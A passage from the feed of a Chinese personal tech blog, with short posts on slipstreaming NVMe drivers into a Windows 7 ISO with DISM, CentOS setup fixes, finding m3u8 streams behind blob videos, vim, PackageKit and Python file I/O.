<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count = objData.time_remain;</span><br><span class="line"><span class="keyword">var</span> refreshId  = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    count--;</span><br><span class="line">    $(<span class="string">'#time_remain&#123;&#123;itm.account_id&#125;&#125;'</span>).text(count);</span><br><span class="line">    <span class="comment">// update timer here</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count === <span class="number">0</span>) &#123;</span><br><span class="line">        $(<span class="string">'#update_btn&#123;&#123;itm.account_id&#125;&#125;'</span>).text(<span class="string">'更新'</span>);</span><br><span class="line">        clearInterval(refreshId);<span class="comment">//退出计时器</span></span><br><span class="line">        <span class="comment">// ajax code here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p>参考:</p>
<p><a href="https://zhuanlan.zhihu.com/p/104425834" target="_blank" rel="noopener">Python+Django网站开发系列12-前后端数据交互总结</a></p>
</form></form>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;添加本地js&quot;&gt;添加本地js&lt;/h3&gt;
&lt;p&gt;在Django应用下新建目录static（与templates同级目录），然后修改&lt;code&gt;settings.py&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;tab
    
    </summary>
    
      <category term="Python" scheme="http://flamepeak.com/categories/Python/"/>
    
    
      <category term="Django" scheme="http://flamepeak.com/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>Windows 7 原版镜像添加nvme m2驱动</title>
    <link href="http://flamepeak.com/2020/08/16/Windows-7-iso-add-nvme-m2-driver/"/>
    <id>http://flamepeak.com/2020/08/16/Windows-7-iso-add-nvme-m2-driver/</id>
    <published>2020-08-16T13:09:23.000Z</published>
    <updated>2020-08-21T02:31:51.346Z</updated>
    
    <content type="html"><![CDATA[<p>首先，如果不是可以自己制作ISO的话，可以尝试it天空的，万能驱动7，已经集成了NVME、USB3驱动和一些更新。</p>
<h3 id="需要的软件">需要的软件</h3>
<p>Dism++</p>
<h3 id="注意事项">注意事项</h3>
<p>你的硬盘应该能在BIOS中看到，如果看不到，我的方法可能不行</p>
<p>如果PE没有发现USB3或NVME设备（即PE不支持），那么万能驱动7也发现不了。</p>
<p>万能驱动7的流程：<br>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入PE-&gt;恢复待部署的系统到系统盘-&gt;运行万能驱动7-&gt;导入驱动到系统驱动库-&gt;重启-&gt;开始系统部署-&gt;部署过程中系统会自动安装导入的驱动-&gt;自动重启进入系统，</span><br></pre></td></tr></table></figure></p>
<h3 id="以下操作可行">以下操作可行</h3>
<p>个人的nvme盘是m2，西部数据SN730</p>
<p>建议在优启通PE中进行修改wim操作，使用<code>dism++</code>挂载映像，在驱动管理中添加如下驱动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dfsd</span><br></pre></td></tr></table></figure>
<p>在更新管理中，安装如下补丁：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows6.1-KB2990941-v3-x64.msu</span><br><span class="line">Windows6.1-KB3087873-v2-x64.msu</span><br><span class="line">Windows6.1-KB2534111-x64.msu</span><br><span class="line">Windows6.1-KB2999226-x64.msu</span><br></pre></td></tr></table></figure>
<p>网上有很多说只需两个，但是这里有四个，也建议如此</p>
<p>wim修改完毕后，保存wim。</p>
<p>接下来，使用WinNTSetup安装器，进行系统安装。 首先，选择wim文件位置，选择引导驱动器的位置，也就是要安装的系统盘位置（SSD盘），选择完毕后三个指示符应该均为绿色，选择安装驱动器的位置，和上一步一样即可，同一个盘符。</p>
<p>注意：SSD系统盘要使用MBR格式，如果是GPT格式，那需要DiskGinus来修改。大致操作，如果SSD没有重要文件，可以先把SSD所有分区删除，然后保存。在SSD上点击右键，将分区表类型转换为MBR格式；然后点击新建分区（不是快速分区），直接下一步、完成即可；点击保存更改，会提示格式化，确定；即可。</p>
<p>继续WinNTSetup安装器，左下角选项，选择要安装的版本</p>
<p>下面谈一下wim封装ISO：</p>
<p>网上有很多方法，都是介绍ultraISO直接替换install.wim，但是，经过多次尝试，总是失败。</p>
<p>最后我使用的是dism++里面的ISO生成工具，首先把原版ISO镜像解压，然后替换sources中的install.wim，再使用ISO生成工具直接生成就可以。</p>
<p>另外，对于Win10的安装ISO来说，其PE环境是同时支持esd和wim安装的，但win7的安装PE环境不支持esd，因为win7时代esd这个格式还没诞生嘛，所以你把转完之后的ESD直接放到Win7的ISO里肯定是用不了的，那咋办呢？其实很简单，你找一个win10的安装ISO（官方的就行），把里面的install.wim文件删掉，把win7的install.esd文件放进去就行了，这样虽然安装界面是win10的，但装出来的系统还是win7，同时还避免了PE环境不支持USB3.0的问题。说简单点，就是自己杂交一个安装ISO，安装环境是Win10的，但install.esd是Win7的就好了，我自己测试过，没有问题。</p>
<p>推荐阅读：https://www.jianshu.com/p/a93253560d78</p>
<h3 id="另外一种方法">另外一种方法</h3>
<p><a href="https://support.lenovo.com/hk/en/solutions/ht103541/" target="_blank" rel="noopener">How to prepare the Windows 7 installation ISO image with USB3.0 driver and NVM Express (NVMe) driver</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">NOTE: It is not recommended to install the NVMe hotfix as a step in the task sequence, please follow the steps below for adding it to the install wim for best results.</span><br><span class="line">1. Install the latest Windows ADK for Windows 8.1 update.</span><br><span class="line">2. Create five local folders at C:\temp and name them as src, mount, winremount, hotfix, and drivers.</span><br><span class="line">3. Copy the setup files from the DVD drive or the mounted Windows 7 installation ISO image to C:\temp\src.</span><br><span class="line">4. Download and install the following NVMe driver for Windows 7 from Microsoft Web site, and then copy the hotfix.msu or hotfix.cab file to C:\temp\hotfix..</span><br><span class="line">Update to add native driver support in NVM Express in Windows 7 and Windows Server 2008 R2 li&gt;</span><br><span class="line">5. If you want to install the Windows 7 operating system using a USB flash drive, copy the USB 3.0 driver files to C:\temp\drivers.</span><br><span class="line">6. Click Start, and type deployment. Right-click Deployment and Imaging Tools Environment and then select Run as administrator.</span><br><span class="line">7. Copy the hotfixes and drivers to the boot.wim file, and then update the sources folder by running the following Deployment Image Servicing and Management (DISM) commands: dism /Mount-Image /ImageFile:c:\temp\src\sources\boot.wim /Index:1 /MountDir:c:\temp\mount</span><br><span class="line"></span><br><span class="line">dism /Image:C:\temp\mount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\mount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Unmount-Image /MountDir:C:\temp\mount /Commit</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\src\sources\boot.wim /Index:2 /MountDir:c:\temp\mount</span><br><span class="line">dism /Image:C:\temp\mount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\mount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line"></span><br><span class="line">Sort the files at C:\temp\mount\sources by date, and then copy the updated files to C:\temp\src\sources (ensure that C:\temp\mount\sources is closed before running the following DISM command). </span><br><span class="line"></span><br><span class="line">dism /Unmount-Image /MountDir:C:\temp\mount /commit</span><br><span class="line"></span><br><span class="line">8. Obtain the index from the Install.wim file by running the following command, and then check every index to see how many indexes have to be updated.</span><br><span class="line"></span><br><span class="line">dism /Get-WimInfo /WimFile:c:\temp\src\sources\install.wim</span><br><span class="line"></span><br><span class="line">9. Copy the hotfixes and drivers to the install.wim file and the winre.wim file by running the following commands:</span><br><span class="line"></span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\src\sources\install.wim /Index:1 /MountDir:c:\temp\mount</span><br><span class="line">dism /Image:C:\temp\mount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\mount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\mount\windows\system32\recovery\winre.wim /Index:1 /MountDir:c:\temp\winremount</span><br><span class="line">dism /Image:C:\temp\winremount/Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\winremount /Commit</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\mount /Commit </span><br><span class="line"></span><br><span class="line">Note: In step 8, if you find multiple indexes have to be updated, update them one by one (only the index number of the first line needs to be updated). For example, if there are four indexes, run the following commands: dism /Mount-Image /ImageFile:c:\temp\src\sources\install.wim /Index:1 /MountDir:c:\temp\mount</span><br><span class="line"></span><br><span class="line">dism /Image:C:\temp\mount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\mount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\mount\windows\system32\recovery\winre.wim /Index:1 /MountDir:c:\temp\winremount</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\winremount /Commit</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\mount /Commit</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\src\sources\install.wim /Index:2 /MountDir:c:\temp\mount</span><br><span class="line">dism /Image:C:\temp\mount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\mount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\mount\windows\system32\recovery\winre.wim /Index:1 /MountDir:c:\temp\winremount</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\winremount /Commit</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\mount /Commit</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\src\sources\install.wim /Index:3 /MountDir:c:\temp\mount</span><br><span class="line">dism /Image:C:\temp\mount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\mount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\mount\windows\system32\recovery\winre.wim /Index:1 /MountDir:c:\temp\winremount</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\winremount /Commit</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\mount /Commit</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\src\sources\install.wim /Index:4 /MountDir:c:\temp\mount</span><br><span class="line">dism /Image:C:\temp\mount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\mount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Mount-Image /ImageFile:c:\temp\mount\windows\system32\recovery\winre.wim /Index:1 /MountDir:c:\temp\winremount</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Package /PackagePath:c:\temp\hotfix</span><br><span class="line">dism /Image:C:\temp\winremount /Add-Driver /Driver:c:\temp\drivers /Recurse</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\winremount /Commit</span><br><span class="line">dism /Unmount-Wim /MountDir:C:\temp\mount /Commit</span><br><span class="line"></span><br><span class="line">10. Create an ISO file, and then rename the label by running the following oscdimg commands:</span><br><span class="line">For Legacy BIOS Boot mode:</span><br><span class="line">oscdimg -LTEST -m -u2 -bC:\temp\src\boot\etfsboot.com C:\temp\src C:\temp\Win7.NVME.ISO</span><br><span class="line"></span><br><span class="line">For Legacy and UEFI BIOS multiple Boot mode:</span><br><span class="line">oscdimg -LTEST -m -u2 -bootdata:2#p0,e,bC:\temp\src\boot\etfsboot.com#pEF,e,bC:\temp\src\efi\microsoft\boot\efisys.bin C:\temp\src C:\temp\Win7.NVME.ISO</span><br><span class="line"></span><br><span class="line">11. Use the ISO file to create a bootable USB flash drive with FAT32 or a bootable DVD.</span><br><span class="line">Note: If the ISO file is larger than 4.7 GB, use a dual-layer DVD to burn the ISO file.</span><br><span class="line"></span><br><span class="line">12. For UEFI boot (only applicable for the 64-bit version of Windows 7 operating system or higher), check if the BOOTX64.EFI file is available at EFI\BOOT\ on the USB flash drive. If not, do the following:</span><br><span class="line">a. Copy the bootmgfw.efi file from C:\Windows\Boot\EFI to \EFI\BOOT\ on the USB flash drive.</span><br><span class="line">b. Rename the file to BOOTX64.EFI.</span><br></pre></td></tr></table></figure>
<h3 id="谈一谈win10的封装">谈一谈Win10的封装</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关于优化我这里先说一下几个坑</span><br><span class="line">1.对于1903及以上的系统，不要禁用windows错误报告服务，即Windows Error Reporting Service。这个服务一旦禁用，打开Widows设置会出现数组越界的BUG或者闪退，甚至可能严重影响系统性能。</span><br><span class="line">2.建议不要禁用系统更新服务，即Windows Update服务。如果禁用了，会出现很多问题，比如无法安装.net3.5，无法使用数字激活工具激活系统，无法使用应用商店下载APP等等。</span><br><span class="line">3.不要禁用Windows防火墙服务，即Windows Firewall服务。如果禁用了，就无法共享打印机。</span><br><span class="line">4.优化《解除程序文件风险警告》后会造成IE自带下载器下载的程序，无法在下载器里直接运行。</span><br><span class="line">5.对于1903及以上的系统，优化《禁止商店自动下载更新》后，无法使用新建账户的方式登录系统，会卡在OOBE界面，但不影响内置管理员方式登录系统。所以，如果不是内置管理员封装的系统就不要优化此项。</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先，如果不是可以自己制作ISO的话，可以尝试it天空的，万能驱动7，已经集成了NVME、USB3驱动和一些更新。&lt;/p&gt;
&lt;h3 id=&quot;需要的软件&quot;&gt;需要的软件&lt;/h3&gt;
&lt;p&gt;Dism++&lt;/p&gt;
&lt;h3 id=&quot;注意事项&quot;&gt;注意事项&lt;/h3&gt;
&lt;p&gt;你的硬盘
    
    </summary>
    
    
      <category term="Windows" scheme="http://flamepeak.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 7 最小化安装遇到的问题</title>
    <link href="http://flamepeak.com/2020/06/16/Linux-CentOS-minimal-install-20200616/"/>
    <id>http://flamepeak.com/2020/06/16/Linux-CentOS-minimal-install-20200616/</id>
    <published>2020-06-16T01:35:12.000Z</published>
    <updated>2020-06-16T00:09:38.480Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ifconfig-not-found">ifconfig not found</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig 在centos 最小化安装时，是不自带的</span><br><span class="line">可以使用ip addr 查看ip</span><br></pre></td></tr></table></figure>
<h3 id="没有ip地址">没有ip地址</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip addr发现ens33 没有inet 这个属性，那么就没法通过IP地址连接虚拟机。</span><br><span class="line">查看ens33网卡的配置：vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">从配置清单中可以发现 CentOS 7 默认是不启动网卡的（ONBOOT=no）。</span><br><span class="line">把这一项改为YES（ONBOOT=yes）</span><br><span class="line">重启网络服务： sudo service network restart</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ifconfig-not-found&quot;&gt;ifconfig not found&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ifc
    
    </summary>
    
      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
    
    
      <category term="CentOS" scheme="http://flamepeak.com/tags/CentOS/"/>
    
  </entry>
  
  <entry>
    <title>blob视频网址分析</title>
    <link href="http://flamepeak.com/2020/06/16/Blob-video-get-url-20200619/"/>
    <id>http://flamepeak.com/2020/06/16/Blob-video-get-url-20200619/</id>
    <published>2020-06-16T01:35:12.000Z</published>
    <updated>2020-06-19T07:56:55.060Z</updated>
    
    <content type="html"><![CDATA[<p>Blob格式视频下载一直比较困难，在此记录一些思路：</p>
<ol type="1">
<li><p>首先找到blob网址，如下：<code>blob:https://xxxxx.h5.xxxxx.com/77e8b2d1-81a7-42f4-83bc-0897b5a82978</code></p></li>
<li><p>在Chrome浏览器中，F12打开开发者工具</p></li>
<li><p>刷新含有视频的目标网页，然后在Network选项卡中查看请求列表</p></li>
<li><p>寻找m3u8扩展名，然后打开指定链接：如<code>https://1252524126.vod2.xxxx.com/522ff1e0vodcq1252524126/867b83575285890790665095068/playlist.f3.m3u8?time=1592553016262</code></p></li>
<li><p>事实上，m3u8是一个文本文件，使用记事本之类工具打开，可以看到如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-VERSION:3</span><br><span class="line">#EXT-X-TARGETDURATION:18</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:16.666667,</span><br><span class="line">playlist.f3.ts?start=0&amp;end=5506707&amp;type=mpegts</span><br><span class="line">#EXTINF:8.333333,</span><br><span class="line">playlist.f3.ts?start=5506708&amp;end=8260155&amp;type=mpegts</span><br><span class="line">#EXTINF:8.333333,</span><br><span class="line">playlist.f3.ts?start=8260156&amp;end=11013603&amp;type=mpegts</span><br><span class="line">#EXTINF:8.333333,</span><br><span class="line">playlist.f3.ts?start=11013604&amp;end=13767427&amp;type=mpegts</span><br><span class="line">#EXTINF:8.333333,</span><br><span class="line">playlist.f3.ts?start=13767428&amp;end=16520875&amp;type=mpegts</span><br><span class="line">#EXTINF:16.666667,</span><br><span class="line">playlist.f3.ts?start=16520876&amp;end=22027771&amp;type=mpegts</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这样就可以分析出视频地址了，就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`https://1252524126.vod2.xxxx.com/522ff1e0vodcq1252524126/867b83575285890790665095068/playlist.f3.ts</span><br></pre></td></tr></table></figure>
<p>直接下载视频即可</p></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blob格式视频下载一直比较困难，在此记录一些思路：&lt;/p&gt;
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;&lt;p&gt;首先找到blob网址，如下：&lt;code&gt;blob:https://xxxxx.h5.xxxxx.com/77e8b2d1-81a7-42f4-83bc-0897b5a
    
    </summary>
    
      <category term="Tools" scheme="http://flamepeak.com/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://flamepeak.com/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Vim 使用汇总</title>
    <link href="http://flamepeak.com/2020/03/28/vim-usage-20200328/"/>
    <id>http://flamepeak.com/2020/03/28/vim-usage-20200328/</id>
    <published>2020-03-28T01:18:00.000Z</published>
    <updated>2020-03-28T01:20:07.510Z</updated>
    
    <content type="html"><![CDATA[<h3 id="搜索高亮">搜索高亮</h3>
<p>vim搜索设置高亮</p>
<p>linux vim打开文档搜索字符串时，设置被搜索到字符串高亮显示。有两种方法：</p>
<p>1、临时设置：vim打开文档<br>
命令行形式输入：<code>set hlsearch</code>。<br>
缺点：关闭文档后，下次打开，又需要重新设置一遍。</p>
<p>2、永久设置（推荐）：在<code>~/.vimrc</code>中设置<br>
在文件中加上<code>set hlsearch </code><br>
然后保存退出便可。<br>
优点：一次设置，永久生效。</p>
<p>取消方法：<br>
<code>:noh</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;搜索高亮&quot;&gt;搜索高亮&lt;/h3&gt;
&lt;p&gt;vim搜索设置高亮&lt;/p&gt;
&lt;p&gt;linux vim打开文档搜索字符串时，设置被搜索到字符串高亮显示。有两种方法：&lt;/p&gt;
&lt;p&gt;1、临时设置：vim打开文档&lt;br&gt;
命令行形式输入：&lt;code&gt;set hlsearc
    
    </summary>
    
      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
    
      <category term="tmux" scheme="http://flamepeak.com/tags/tmux/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 7 禁用自动更新</title>
    <link href="http://flamepeak.com/2020/03/17/Linux-CentOS-disable-autoupdate-20200317/"/>
    <id>http://flamepeak.com/2020/03/17/Linux-CentOS-disable-autoupdate-20200317/</id>
    <published>2020-03-17T01:35:12.000Z</published>
    <updated>2020-03-17T01:49:19.035Z</updated>
    
    <content type="html"><![CDATA[<p>PackageKit是基于RedHat的linux中的图形化软件升级工具，下面描述一下如何禁止和启用自动升级。</p>
<p>默认状态下是开启的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">systemctl status packagekit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停用</span></span><br><span class="line">systemctl stop packagekit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁止自启动</span></span><br><span class="line">systemctl mask packagekit</span><br><span class="line">  Created symlink from /etc/systemd/system/packagekit.service to /dev/null.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载PackageKit</span></span><br><span class="line">yum remove PackageKit*</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装PackageKit</span></span><br><span class="line">yum install gnome-packagekit PackageKit-yum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自启动</span></span><br><span class="line">systemctl unmask packagekit</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看状态</span></span><br><span class="line">systemctl status packagekit</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动</span></span><br><span class="line">systemctl start packagekit</span><br></pre></td></tr></table></figure>
<p>systemctl的常见用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl 提供了一组子命令来管理单个的 unit，其命令格式为：</span><br><span class="line">systemctl [command] [unit]</span><br><span class="line">command 主要有：</span><br><span class="line">start：立刻启动后面接的 unit。</span><br><span class="line">stop：立刻关闭后面接的 unit。</span><br><span class="line">restart：立刻关闭后启动后面接的 unit，亦即执行 stop 再 start 的意思。</span><br><span class="line">reload：不关闭 unit 的情况下，重新载入配置文件，让设置生效。</span><br><span class="line">enable：设置下次开机时，后面接的 unit 会被启动。</span><br><span class="line">disable：设置下次开机时，后面接的 unit 不会被启动。</span><br><span class="line">status：目前后面接的这个 unit 的状态，会列出有没有正在执行、开机时是否启动等信息。</span><br><span class="line">is-active：目前有没有正在运行中。</span><br><span class="line">is-enable：开机时有没有默认要启用这个 unit。</span><br><span class="line">kill ：不要被 kill 这个名字吓着了，它其实是向运行 unit 的进程发送信号。</span><br><span class="line">show：列出 unit 的配置。</span><br><span class="line">mask：注销 unit，注销后你就无法启动这个 unit 了。</span><br><span class="line">unmask：取消对 unit 的注销。</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PackageKit是基于RedHat的linux中的图形化软件升级工具，下面描述一下如何禁止和启用自动升级。&lt;/p&gt;
&lt;p&gt;默认状态下是开启的。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code
    
    </summary>
    
      <category term="Python" scheme="http://flamepeak.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://flamepeak.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python 在virtualenv中使用Idle</title>
    <link href="http://flamepeak.com/2020/03/16/Python-launch-idle-in-virtual-environment-20200316/"/>
    <id>http://flamepeak.com/2020/03/16/Python-launch-idle-in-virtual-environment-20200316/</id>
    <published>2020-03-16T00:50:12.000Z</published>
    <updated>2020-03-16T00:52:40.269Z</updated>
    
    <content type="html"><![CDATA[<p>首先，进入虚拟环境，并激活 然后，运行命令<code>python -m idlelib.idle</code>，即可</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先，进入虚拟环境，并激活 然后，运行命令&lt;code&gt;python -m idlelib.idle&lt;/code&gt;，即可&lt;/p&gt;

    
    </summary>
    
      <category term="Python" scheme="http://flamepeak.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://flamepeak.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python 读写List到文件的方式</title>
    <link href="http://flamepeak.com/2020/03/16/Python-Read-Write-list-to-file-20200316/"/>
    <id>http://flamepeak.com/2020/03/16/Python-Read-Write-list-to-file-20200316/</id>
    <published>2020-03-16T00:20:12.000Z</published>
    <updated>2020-03-16T00:48:40.731Z</updated>
    
    <content type="html"><![CDATA[<p>关于读写文件，在Python中提供了<code>read()</code>、<code>write()</code>来读写一行，也提供了<code>readlines()</code>、<code>writelines()</code>读写多行的方式。此外，模块<code>pickle</code>、<code>json</code>允许我们以更方便快捷的方式处理序列化的数据集。</p>
<h3 id="使用read-和write方法">使用read 和write方法</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define list of places</span></span><br><span class="line">places = [<span class="string">'Berlin'</span>, <span class="string">'Cape Town'</span>, <span class="string">'Sydney'</span>, <span class="string">'Moscow'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="keyword">for</span> listitem <span class="keyword">in</span> places:</span><br><span class="line">        filehandle.write(<span class="string">'%s\n'</span> % listitem)</span><br></pre></td></tr></table></figure>
<p>注意，最后一行添加了<code>\n</code>，从这个文件中读取列表，可以使用以下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define an empty list</span></span><br><span class="line">places = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># open file and read the content in a list</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> filehandle:</span><br><span class="line">        <span class="comment"># remove linebreak which is the last character of the string</span></span><br><span class="line">        currentPlace = line[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add item to the list</span></span><br><span class="line">        places.append(currentPlace)</span><br></pre></td></tr></table></figure>
<p>一定要注意，需要把最后的换行符去掉。</p>
<h3 id="使用readlines-和-writelines方法">使用readlines 和 writelines方法</h3>
<p>写入文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define list of places</span></span><br><span class="line">places_list = [<span class="string">'Berlin'</span>, <span class="string">'Cape Town'</span>, <span class="string">'Sydney'</span>, <span class="string">'Moscow'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    filehandle.writelines(<span class="string">"%s\n"</span> % place <span class="keyword">for</span> place <span class="keyword">in</span> places_list)</span><br></pre></td></tr></table></figure>
<p>读取文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define empty list</span></span><br><span class="line">places = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># open file and read the content in a list</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    filecontents = filehandle.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> filecontents:</span><br><span class="line">        <span class="comment"># remove linebreak which is the last character of the string</span></span><br><span class="line">        current_place = line[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add item to the list</span></span><br><span class="line">        places.append(current_place)</span><br></pre></td></tr></table></figure>
<p>或者，以更精简的方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># define empty list</span></span><br><span class="line">places = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># open file and read the content in a list</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    places = [current_place.rstrip() <span class="keyword">for</span> current_place <span class="keyword">in</span> filehandle.readlines()]</span><br></pre></td></tr></table></figure>
<h3 id="使用pickle模块">使用pickle模块</h3>
<p>Its <code>dump()</code> method stores the list efficiently as a binary data stream. Firstly, in line 7 (in the code below) the output file <code>listfile.data</code> is opened for binary writing<code>"wb"</code>. Secondly, in line 9 the list is stored in the opened file using the <code>dump()</code> method.</p>
